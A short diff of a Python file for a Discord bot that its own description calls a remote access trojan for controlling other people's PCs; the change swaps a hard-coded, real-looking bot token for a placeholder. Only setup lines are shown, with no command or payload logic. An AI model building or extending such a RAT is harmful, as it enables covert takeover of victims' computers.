@@ -32,7 +32,7 @@ from discord_slash.utils.manage_components import create_button, create_actionro
 client = commands.Bot(command_prefix='!', intents=discord.Intents.all(), description='Discord RAT to shits on pc\'s')
 slash = SlashCommand(client, sync_commands=True)
 
-token = 'OTAxNzU5NDQ1NjU3MzI1NjIw.YXUi7Q.1BCg90gLHDGvjpmSgSy1AoX5t6w' #bot token that will you will control their pc thru
+token = 'BOT_TOKE_HERE' #bot token that will you will control their pc thru
 g = [GUILD_ID_HERE] #guild id that the slash commands get registered on
 
 @client.event
